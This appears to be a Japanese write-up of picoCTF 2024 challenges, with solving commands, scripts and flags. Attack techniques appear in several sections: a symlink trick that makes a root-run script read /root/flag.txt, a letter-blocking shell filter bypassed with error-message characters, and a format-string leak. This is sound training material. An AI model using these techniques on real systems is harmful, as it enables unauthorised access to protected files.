<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{ax8mC0RU6ve_NX85l4ax8mCl_a3eb5ac2}

</aside>

### endianness-v2

<img src="/img/2024/03-27/Untitled%2034.png" width="550px" height="auto"> 

32-bits systemからのファイルということで、4バイトごとに無茶苦茶にシャッフルしたエンディアンなのだろうと予想。

4! = 24 通り全てのシャッフルを作ってファイル保存する。

```bash
import itertools
import struct

## ファイルをバイナリモードで開く
with open("challengefile", "rb") as f:
    data = f.read()

## 4バイトずつ読み取る
chunks = [data[i : i + 4] for i in range(0, len(data), 4)]

## すべての可能な組み合わせでシャッフルする
for i, permutation in enumerate(itertools.permutations([0, 1, 2, 3])):
    # 新しいファイルを作成する
    with open(f"challengefile-{i}", "wb") as f:
        for chunk in chunks:
            if len(chunk) != 4:
                # ファイルの最後のチャンクが4バイト未満の場合、そのまま書き込む
                f.write(chunk)
            else:
                # バイトをシャッフルして書き込む
                f.write(struct.pack("4B", *(chunk[j] for j in permutation)))

```

実行したあとで各ファイルを file コマンドで見てみる。

```bash
% file *
challengefile:        data
challengefile-0:      data
challengefile-1:      data
challengefile-10:     data
challengefile-11:     data
challengefile-12:     data
challengefile-13:     data
challengefile-14:     data
challengefile-15:     data
challengefile-16:     data
challengefile-17:     data
challengefile-18:     data
challengefile-19:     data
challengefile-2:      data
challengefile-20:     data
challengefile-21:     data
challengefile-22:     data
challengefile-23:     JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 300x150, components 3
challengefile-3:      data
challengefile-4:      data
challengefile-5:      data
challengefile-6:      data
challengefile-7:      data
challengefile-8:      data
challengefile-9:      JPEG image data
solve.py:             Unicode text, UTF-8 text
```

challengefile-23 と challengefile-9 がJPEGっぽい。challengefile-23 を .jpg ファイルとして適当なビュワーで開くとフラグ。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{cert!f1Ed_iNd!4n_s0rrY_3nDian_76e05f49}

</aside>

### Blast from the past

<img src="/img/2024/03-27/Untitled%2035.png" width="550px" height="auto"> 

主にexiftoolを使ってEXIFタグのタイムスタンプを書き換えていく問題。

```bash
cp original.jpg 1.jpg

exiftool -DateTimeOriginal='1970:01:01 00:00:00' 1.jpg
exiftool -ModifyDate='1970:01:01 00:00:00' 1.jpg
exiftool -CreateDate='1970:01:01 00:00:00' 1.jpg
exiftool -SubSecCreateDate='1970:01:01 00:00:00.001' 1.jpg
exiftool -SubSecDateTimeOriginal='1970:01:01 00:00:00.001' 1.jpg
exiftool -SubSecModifyDate='1970:01:01 00:00:00.001' 1.jpg

exiftool -TimeStamp='1970:01:01 00:00:00.001+00:00' 1.jpg
```

この状態でチェックしてみる。

```bash
% nc -q 2 mimas.picoctf.net 65054 < 1.jpg

% nc mimas.picoctf.net 64910
MD5 of your picture:
eb5ae92ce9f801b9d1aa8e4c800e9705  test.out

Checking tag 1/7
Looking at IFD0: ModifyDate
Looking for '1970:01:01 00:00:00'
Found: 1970:01:01 00:00:00
Great job, you got that one!

Checking tag 2/7
Looking at ExifIFD: DateTimeOriginal
Looking for '1970:01:01 00:00:00'
Found: 1970:01:01 00:00:00
Great job, you got that one!

Checking tag 3/7
Looking at ExifIFD: CreateDate
Looking for '1970:01:01 00:00:00'
Found: 1970:01:01 00:00:00
Great job, you got that one!

Checking tag 4/7
Looking at Composite: SubSecCreateDate
Looking for '1970:01:01 00:00:00.001'
Found: 1970:01:01 00:00:00.001
Great job, you got that one!

Checking tag 5/7
Looking at Composite: SubSecDateTimeOriginal
Looking for '1970:01:01 00:00:00.001'
Found: 1970:01:01 00:00:00.001
Great job, you got that one!

Checking tag 6/7
Looking at Composite: SubSecModifyDate
Looking for '1970:01:01 00:00:00.001'
Found: 1970:01:01 00:00:00.001
Great job, you got that one!

Checking tag 7/7
Timezones do not have to match, as long as it's the equivalent time.
Looking at Samsung: TimeStamp
Looking for '1970:01:01 00:00:00.001+00:00'
Found: 2023:11:20 20:46:21.420+00:00
Oops! That tag isn't right. Please try again.
```

7番目のチェックに失敗するが、 `Samsung: TimeStamp` というタグは素直には編集させてもらえない。

```bash
% exiftool -TimeStamp='1970:01:01 00:00:00.001' 1.jpg
Warning: Not an integer for XMP-apple-fi:TimeStamp
    0 image files updated
    1 image files unchanged
```

どうやらこのタイムスタンプは、オフセット 0x2b82ae から始まるSamusungの拡張領域？に書いてあるよう。

```bash
% exiftool -v 1.jpg
...
Samsung trailer (143 bytes at offset 0x2b82ae):
  SamsungTrailer_0x0a01Name = Image_UTC_Data
  TimeStamp = 1700513181420
  SamsungTrailer_0x0aa1Name = MCC_Data
  MCCData = 310
  SamsungTrailer_0x0c61Name = Camera_Capture_Mode_Info
  SamsungTrailer_0x0c61 = 1
```

バイナリエディタで開いてみる。

<img src="/img/2024/03-27/Untitled%2036.png" width="550px" height="auto"> 

タイムスタンプは `UTC_Data1700513181420` という形式で入っている。

ここを試行錯誤しながら編集すると、 `UTC_Data0000000000001` で所望の `1970:01:01 00:00:00.001+00:00` になる。

```bash
% nc -q 2 mimas.picoctf.net 53963 < 1.jpg

% nc  mimas.picoctf.net 63469
MD5 of your picture:
412331ca77b633d2529dc0e0ab5ad6eb  test.out

Checking tag 1/7
Looking at IFD0: ModifyDate
Looking for '1970:01:01 00:00:00'
Found: 1970:01:01 00:00:00
Great job, you got that one!

Checking tag 2/7
Looking at ExifIFD: DateTimeOriginal
Looking for '1970:01:01 00:00:00'
Found: 1970:01:01 00:00:00
Great job, you got that one!

Checking tag 3/7
Looking at ExifIFD: CreateDate
Looking for '1970:01:01 00:00:00'
Found: 1970:01:01 00:00:00
Great job, you got that one!

Checking tag 4/7
Looking at Composite: SubSecCreateDate
Looking for '1970:01:01 00:00:00.001'
Found: 1970:01:01 00:00:00.001
Great job, you got that one!

Checking tag 5/7
Looking at Composite: SubSecDateTimeOriginal
Looking for '1970:01:01 00:00:00.001'
Found: 1970:01:01 00:00:00.001
Great job, you got that one!

Checking tag 6/7
Looking at Composite: SubSecModifyDate
Looking for '1970:01:01 00:00:00.001'
Found: 1970:01:01 00:00:00.001
Great job, you got that one!

Checking tag 7/7
Timezones do not have to match, as long as it's the equivalent time.
Looking at Samsung: TimeStamp
Looking for '1970:01:01 00:00:00.001+00:00'
Found: 1970:01:01 00:00:00.001+00:00
Great job! You got that one!

You did it!
picoCTF{71m3_7r4v311ng_p1c7ur3_ed953b57}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{71m3_7r4v311ng_p1c7ur3_ed953b57}

</aside>

### Dear Diary

<img src="/img/2024/03-27/Untitled%2037.png" width="550px" height="auto"> 

めちゃくちゃ難しかった…

ext4なディスクイメージの解析だが、削除済みファイル含めて特に怪しいものはない。

`/root/` 以下は

```bash
% fls -rp -o 0001140736  disk.flag.img 204
r/r 1837:       .ash_history
d/d 1842:       secret-secrets
r/r 1843:       secret-secrets/force-wait.sh
r/r 1844:       secret-secrets/innocuous-file.txt
r/r 1845:       secret-secrets/its-all-in-the-name
```

といった感じで意味深だが…

---

試行錯誤を経て編集前のファイルが見たくなり、ext4ってジャーナルあったよな？と思いを馳せる。

[https://qiita.com/rarul/items/1cdd5e7dc5b436dc2b3c#jdb2](https://qiita.com/rarul/items/1cdd5e7dc5b436dc2b3c#jdb2) によると、inode 8番がジャーナルらしい。

```bash
icat -o 0001140736  disk.flag.img 8 |strings
```

の結果をなんとなく眺めていると、 `original-filename` の文字列を見つける。これは怪しい。

心の目で眺めると `oCT` や `F{1` の文字列も見つかり、これですわ。どうやら `its-all-in-the-name` ファイルは、 `original-filename` からフラグ断片の名前を経てリネームされてきたよう。

以下コマンドからフラグの断片を集める。

```bash
% icat -o 0001140736  disk.flag.img 8 |xxd |grep s-file.txt -A3
001f8840: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......
001f8850: 0000 0000 0000 0000 0000 0000 0000 0000  ................
001f8860: 0000 0000 0000 0000 0000 0000 0000 0000  ................
001f8870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
001fbc40: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...
001fbc50: a803 1101 6f72 6967 696e 616c 2d66 696c  ....original-fil
001fbc60: 656e 616d 6500 0000 0000 0000 0000 0000  ename...........
001fbc70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
001fdc40: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......
001fdc50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
001fdc60: 0000 0000 0000 0000 3507 0000 8c03 0301  ........5.......
001fdc70: 7069 6300 0000 0000 0000 0000 0000 0000  pic.............
--
001ff440: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...
001ff450: a803 0301 6f43 5400 0000 0000 0000 0000  ....oCT.........
001ff460: 0000 0000 0000 0000 0000 0000 0000 0000  ................
001ff470: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
00201840: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......
00201850: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......
00201860: 467b 3100 0000 0000 0000 0000 0000 0000  F{1.............
00201870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
00203c40: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...
00203c50: a803 0301 5f35 3300 0000 0000 0000 0000  ...._53.........
00203c60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00203c70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
00206040: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......
00206050: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......
00206060: 335f 6e00 0000 0000 0000 0000 0000 0000  3_n.............
00206070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
00207840: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...
00207850: a803 0301 346d 3300 0000 0000 0000 0000  ....4m3.........
00207860: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00207870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
00209c40: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......
00209c50: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......
00209c60: 355f 3800 0000 0000 0000 0000 0000 0000  5_8.............
00209c70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
0020b440: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...
0020b450: a803 0301 3064 3200 0000 0000 0000 0000  ....0d2.........
0020b460: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0020b470: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
0020d840: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......
0020d850: 0000 0000 0000 0000 3507 0000 9c03 0301  ........5.......
0020d860: 3462 3300 0000 0000 0000 0000 0000 0000  4b3.............
0020d870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
0020fc40: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...
0020fc50: a803 0201 307d 0000 0000 0000 0000 0000  ....0}..........
0020fc60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0020fc70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
--
00211440: 732d 6669 6c65 2e74 7874 0000 0000 0000  s-file.txt......
00211450: 0000 0000 0000 0000 3507 0000 9c03 1301  ........5.......
00211460: 6974 732d 616c 6c2d 696e 2d74 6865 2d6e  its-all-in-the-n
00211470: 616d 6500 0000 0000 0000 0000 0000 0000  ame.............
```

```python
001ff400: 3207 0000 0c00 0102 2e00 0000 cc00 0000  2...............
001ff410: 0c00 0202 2e2e 0000 3307 0000 1800 0d01  ........3.......
001ff420: 666f 7263 652d 7761 6974 2e73 6800 0000  force-wait.sh...
001ff430: 3407 0000 1c00 1201 696e 6e6f 6375 6f75  4.......innocuou
001ff440: 732d 6669 6c65 2e74 7874 0000 3507 0000  s-file.txt..5...
001ff450: a803 0301 6f43 5400 0000 0000 0000 0000  ....oCT.........
001ff460: 0000 0000 0000 0000 0000 0000 0000 0000  ................
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{1_533_n4m35_80d24b30}

</aside>

## General Skills

### Super SSH

<img src="/img/2024/03-27/Untitled%2038.png" width="550px" height="auto"> 

```python
% ssh ctf-player@titan.picoctf.net -p 65080
Warning: Permanently added '[titan.picoctf.net]:65080' (ED25519) to the list of known hosts.
ctf-player@titan.picoctf.net's password:
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
Welcome ctf-player, here's your flag: picoCTF{s3cur3_c0nn3ct10n_5d09a462}
Connection to titan.picoctf.net closed.
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s3cur3_c0nn3ct10n_5d09a462}

</aside>

### Commitment Issues

<img src="/img/2024/03-27/Untitled%2039.png" width="550px" height="auto"> 

gitのlog見る。

```bash
% unzip challenge.zip
% cd drop-in
% cat message.txt
TOP SECRET
% git log -p
```

```diff
commit e1237df82d2e69f62dd53279abc1c8aeb66f6d64 (HEAD -> master)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:10:14 2024 +0000

    remove sensitive info

diff --git a/message.txt b/message.txt
index 96f7309..d552d1e 100644
--- a/message.txt
+++ b/message.txt
@@ -1 +1 @@
-picoCTF{s@n1t1z3_30e86d36}
+TOP SECRET

commit 3d5ec8a26ee7b092a1760fea18f384c35e435139
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:10:14 2024 +0000

    create flag

diff --git a/message.txt b/message.txt
new file mode 100644
index 0000000..96f7309
--- /dev/null
+++ b/message.txt
@@ -0,0 +1 @@
+picoCTF{s@n1t1z3_30e86d36}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{s@n1t1z3_30e86d36}

</aside>

### **Time Machine**

<img src="/img/2024/03-27/Untitled%2040.png" width="550px" height="auto"> 

Commitment Issues に続きまたgit問題。 `git log -p` したらコミットメッセージにフラグ。

```diff
commit 705ff639b7846418603a3272ab54536e01e3dc43 (HEAD -> master)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:10:36 2024 +0000

    picoCTF{t1m3m@ch1n3_b476ca06}

diff --git a/message.txt b/message.txt
new file mode 100644
index 0000000..4324621
--- /dev/null
+++ b/message.txt
@@ -0,0 +1 @@
+This is what I was working on, but I'd need to look at my commit history to know why...
\ No newline at end of file
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{t1m3m@ch1n3_b476ca06}

</aside>

### Blame Game

<img src="/img/2024/03-27/Untitled%2041.png" width="550px" height="auto"> 

添付の中には不完全な .py 。

（タイトル通りgit blameしても良いが）git log -p で一番下の方のコミットログにフラグ。

```bash
% git log -p
...

commit 0fe87f16cbd8129ed5f7cf2f6a06af6688665728
Author: picoCTF{@sk_th3_1nt3rn_ea346835} <ops@picoctf.com>
Date:   Sat Mar 9 21:09:25 2024 +0000

    optimize file size of prod code

diff --git a/message.py b/message.py
index 7df869a..326544a 100644
--- a/message.py
+++ b/message.py
@@ -1 +1 @@
-print("Hello, World!")
+print("Hello, World!"
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{@sk_th3_1nt3rn_ea346835}

</aside>

### Collaborative Development

<img src="/img/2024/03-27/Untitled%2042.png" width="550px" height="auto"> 

ブランチがいくつかあるので一気通貫でログを見る。

```bash
% git log -p --branches='*'

commit 74ae5215b93a82ddf3dd37df3d4c6b5aff0a93ed (feature/part-1)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:09:51 2024 +0000

    add part 1

diff --git a/flag.py b/flag.py
index 77d6cec..6e17fb3 100644
--- a/flag.py
+++ b/flag.py
@@ -1 +1,2 @@
 print("Printing the flag...")
+print("picoCTF{t3@mw0rk_", end='')
\ No newline at end of file

commit b4612c914d8461d1b1a50652cc303b76813ee142 (feature/part-2)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:09:51 2024 +0000

    add part 2

diff --git a/flag.py b/flag.py
index 77d6cec..7ab4e25 100644
--- a/flag.py
+++ b/flag.py
@@ -1 +1,3 @@
 print("Printing the flag...")
+
+print("m@k3s_th3_dr3@m_", end='')
\ No newline at end of file

commit 5c6d493ac583a95117d3a70eb5b10d9d76991c48 (feature/part-3)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:09:51 2024 +0000

    add part 3

diff --git a/flag.py b/flag.py
index 77d6cec..59d9bf3 100644
--- a/flag.py
+++ b/flag.py
@@ -1 +1,3 @@
 print("Printing the flag...")
+
+print("w0rk_4c24302f}")

commit 6ce09adec311b859780caf89d993c58e34b53fa6 (HEAD -> main)
Author: picoCTF <ops@picoctf.com>
Date:   Sat Mar 9 21:09:51 2024 +0000

    init flag printer

diff --git a/flag.py b/flag.py
new file mode 100644
index 0000000..77d6cec
--- /dev/null
+++ b/flag.py
@@ -0,0 +1 @@
+print("Printing the flag...")
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{t3@mw0rk_m@k3s_th3_dr3@m_w0rk_4c24302f}

</aside>

### binhexa

<img src="/img/2024/03-27/Untitled%2043.png" width="550px" height="auto"> 

ncで繋いで指示通りビット演算。

```bash
% nc titan.picoctf.net 62817

Welcome to the Binary Challenge!"
Your task is to perform the unique operations in the given order and find the final result in hexadecimal that yields the flag.

Binary Number 1: 01110110
Binary Number 2: 00000001

Question 1/6:
Operation 1: '|'
Perform the operation on Binary Number 1&2.
Enter the binary result: 01110111
Correct!

Question 2/6:
Operation 2: '<<'
Perform a left shift of Binary Number 1 by 1 bits.
Enter the binary result: 11101100
Correct!

Question 3/6:
Operation 3: '&'
Perform the operation on Binary Number 1&2.
Enter the binary result: 00000000
Correct!

Question 4/6:
Operation 4: '>>'
Perform a right shift of Binary Number 2 by 1 bits .
Enter the binary result: 00000000
Correct!

Question 5/6:
Operation 5: '*'
Perform the operation on Binary Number 1&2.
Enter the binary result: 01110110
Correct!

Question 6/6:
Operation 6: '+'
Perform the operation on Binary Number 1&2.
Enter the binary result: 01110111
Correct!

Enter the results of the last operation in hexadecimal: 0x77

Correct answer!
The flag is: picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_aeaf4b09}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{b1tw^3se_0p3eR@tI0n_su33essFuL_aeaf4b09}

</aside>

### Binary Search

<img src="/img/2024/03-27/Untitled%2044.png" width="550px" height="auto"> 

sshして暗算で適当に二分探索。

```bash
% ssh -p 62850 ctf-player@atlas.picoctf.net
ctf-player@atlas.picoctf.net's password:
Permission denied, please try again.
ctf-player@atlas.picoctf.net's password:
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
Welcome to the Binary Search Game!
I'm thinking of a number between 1 and 1000.
Enter your guess: 500
Higher! Try again.
Enter your guess: 750
Higher! Try again.
Enter your guess: 825
Lower! Try again.
Enter your guess: 770
Higher! Try again.
Enter your guess: 800
Lower! Try again.
Enter your guess: 785
Congratulations! You guessed the correct number: 785
Here's your flag: picoCTF{g00d_gu355_de9570b0}
Connection to atlas.picoctf.net closed.
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{g00d_gu355_de9570b0}

</aside>

### endianness

<img src="/img/2024/03-27/Untitled%2045.png" width="550px" height="auto"> 

ソースコードももらえているので、インタラクティブなソルバーを書いた。

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

// 添付ソースと同じもの
char *find_little_endian(const char *word)
{
    size_t word_len = strlen(word);
    char *little_endian = (char *)malloc((2 * word_len + 1) * sizeof(char));

    for (size_t i = word_len; i-- > 0;)
    {
        snprintf(&little_endian[(word_len - 1 - i) * 2], 3, "%02X", (unsigned char)word[i]);
    }

    little_endian[2 * word_len] = '\0';
    return little_endian;
}

// 添付ソースと同じもの
char *find_big_endian(const char *word)
{
    size_t length = strlen(word);
    char *big_endian = (char *)malloc((2 * length + 1) * sizeof(char));

    for (size_t i = 0; i < length; i++)
    {
        snprintf(&big_endian[i * 2], 3, "%02X", (unsigned char)word[i]);
    }

    big_endian[2 * length] = '\0';
    return big_endian;
}

int main() {
    char challenge_word[10];

    while (1)
    {
        printf("enter the word\n");
        scanf("%10s", challenge_word);

        printf("(1) little endian\n(2) big endian\n");
        int choice;
        scanf("%d", &choice);

        switch (choice)
        {
        case 1:
            printf("Little Endian: %s\n", find_little_endian(challenge_word));
            break;
        case 2:
            printf("Big Endian: %s\n", find_big_endian(challenge_word));
            break;
        default:
            printf("Invalid choice\n");
        }
    }
}
```

こいつ使ってlittle, big endianのhexを出力し、フラグゲット。

```c
% nc titan.picoctf.net 51120
Welcome to the Endian CTF!
You need to find both the little endian and big endian representations of a word.
If you get both correct, you will receive the flag.
Word: gvdgo
Enter the Little Endian representation: 6F67647667
Correct Little Endian representation!
Enter the Big Endian representation: 677664676F
Correct Big Endian representation!
Congratulations! You found both endian representations correctly!
Your Flag is: picoCTF{3ndi4n_sw4p_su33ess_d58517b6}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{3ndi4n_sw4p_su33ess_d58517b6}

</aside>

### dont-you-love-banners

<img src="/img/2024/03-27/Untitled%2046.png" width="550px" height="auto"> 

まず上に書いてある方にnc。

```c
% nc tethys.picoctf.net 56157
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

sshの？パスワードが見える。

次に下に書いてある方にnc。さっきのパスワードと、クイズ（これいる？）の答えをググって入力。

```c
% nc tethys.picoctf.net 57443
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper

player@challenge:~$ ls -l
ls -l
total 8
-rw-r--r-- 1 player player 114 Feb  7 17:25 banner
-rw-r--r-- 1 root   root    13 Feb  7 17:25 text
player@challenge:~$ id
id
uid=1000(player) gid=1000(player) groups=1000(player)
```

こんな感じでシェルログインさせてもらえる。目的の `/root/flag.txt` はログインユーザーでは読めない。

下記の `/root/script.py` がrootユーザーで実行されるさっきの問答。

```python
player@challenge:~$ cat /root/script.py
cat /root/script.py

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

## 以下略
```

rootユーザーで `/home/player/banner` をreadしているので、そのファイルを `/root/flag.txt` に置き換えてやれば良い。

```bash
player@challenge:~$ mv banner banner.bak
mv banner banner.bak
player@challenge:~$ ln -s /root/flag.txt banner
ln -s /root/flag.txt banner
```

この状態でもう一度ncすると、フラグゲット。

```bash
% nc tethys.picoctf.net 57443
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

what is the password?
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_8126c9b0}

</aside>

### SansAlpha

<img src="/img/2024/03-27/Untitled%2047.png" width="550px" height="auto"> 

難しかった！

sshでつなぐと、bashの上に「アルファベット入力全部弾く」フィルタが掛かったシェルに通される。

```bash
SansAlpha$ ls
SansAlpha: Unknown character detected
SansAlpha$ @@@
bash: @@@: command not found
```

流石に英字がないのは厳しいのでなんとか手に入れたい。エラー出力から手に入れよう。

- エラー出力を変数に代入し、
- その変数内の文字を1文字ずつ取り出し、
- バッククオートの中でコマンドとして実行させる

というアイディアで色々とコマンドが打てるようになる。

```bash
## 変数 $_1 に、エラー出力である "bash: @@@@@@: command not found" の文字列を代入
SansAlpha$ _1=`@@@@@@ 2>&1`

## 変数 $_1 をコマンドとして実行し、「bashはそんなコマンド知らないよ」エラーを受け取ることで、 $_1 の内容を確認
SansAlpha$ `"$_1"`
bash: bash: @@@@@@: command not found: command not found
##     ^      この間が $_1             ^
```

“bash: @@@@@@: command not found” の文字列から c, a, t が取り出せる。つまりcatコマンドが手に入る！

```bash
## $_1 の(0-originで) 14文字目(c), 1文字目(a), 24文字目(t) を $_2 に代入
SansAlpha$ _2="${_1:14:1}${_1:1:1}${_1:24:1}"

## pwdのファイルを全部catしてみる
SansAlpha$ `$_2 *`
cat: blargh: Is a directory
bash: The: command not found
```

“The” の部分はファイルが読めていそう。 “blargh” の部分は、その名前のディレクトリをcatしちゃってる。深入りしてみる。

```bash
## The の方のファイルの中身を $_3 に代入
SansAlpha$ _3=`$_2 *`
cat: blargh: Is a directory

## こっちのファイルにはフラグがない
SansAlpha$ `"$_3"`
bash: $'The Calastran multiverse is a complex and interconnected web of realities, each\nwith its own distinct characteristics and rules. At its core is the Nexus, a\ncosmic hub that serves as the anchor point for countless universes and\ndimensions. These realities are organized into Layers, with each Layer\nrepresenting a unique
 level of existence, ranging from the fundamental building\nblocks of reality to the most intricate and fantastical realms. Travel between\nLayers is facilitated by Quantum Bridges, mysterious conduits that allow\nindividuals to navigate the multiverse. Notably, the Calastran multiverse\nexhibits a dynamic nature, with the Fabric
of Reality continuously shifting and\nevolving. Within this vast tapestry, there exist Nexus Nodes, focal points of\nimmense energy that hold sway over the destinies of entire universes. The\nenigmatic Watchers, ancient beings attuned to the ebb and flow of the\nmultiverse, observe and influence key events. While the structure of
Calastran\nembraces diversity, it also poses challenges, as the delicate balance between\nthe Layers requires vigilance to prevent catastrophic breaches and maintain the\ncosmic harmony.': command not found

## blargh ディレクトリ名を $_5 に代入
SansAlpha$ _4=`$_2 * 2>&1`
SansAlpha$ `"$_4"`
bash: $'cat: blargh: Is a directory(後略)
SansAlpha$ _5="${_4:5:6}"

## blargh ディレクトリの中のファイルをcatし、その中を読む
SansAlpha$ _6=`$_2 $_5/*`
SansAlpha$ `"$_6"`
bash: $'return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}Alpha-9, a distinctive layer within the Calastran multiverse, stands as a\nsanctuary realm offering individuals a rare opportunity for rebirth and\nintrospection. Positioned as a serene refuge between the higher and lower\nLayers, Alpha-9 serves as a cosmic haven where beings can start anew,\nunburdened by the complexities of their past lives. The realm is characterized\nby ethereal landscapes and soothing energies that facilitate healing and\nself-discovery. Quantum Resonance Wells, unique to Alpha-9, act as conduits for\nindividuals to reflect on their past experiences from a safe and contemplative\ndistance. Here, time flows differently, providing a respite for those seeking\nsolace and renewal. Residents of Alpha-9 find themselves surrounded by an\natmosphere of rejuvenation, encouraging personal growth and the exploration of\nuntapped potential. While the layer offers a haven for introspection, it is not\nwithout its challenges, as individuals must confront their past and navigate\nthe delicate equilibrium between redemption and self-acceptance within this\ntranquil cosmic retreat.': command not found
```

やっとフラグ。

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}

</aside>

## Binary Exploitation

### format string 0

<img src="/img/2024/03-27/Untitled%2048.png" width="550px" height="auto"> 

タイトルからして書式文字列攻撃。

ただし、 `printf()` にフォーマット指定子なしで直接渡される文字列は、 `on_menu()` 関数で所定の文字列との完全一致判定されているので自由度はない。

```c
// 抜粋1
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);

// 抜粋2
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);

```

最初の選択で `Gr%114d_Cheese`, 次の選択で `Cla%sic_Che%s%steak` を選べばフラグがリーク。

```c
% nc mimas.picoctf.net 60904
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}

</aside>

### heap 0

<img src="/img/2024/03-27/Untitled%2049.png" width="550px" height="auto"> 

タイトルと問題文からして、ヒープオーバーフローの問題。

ヒープにセットされているcanary文字列 `"bico"` を書き換えてフラグ表示機能を叩けばOK。
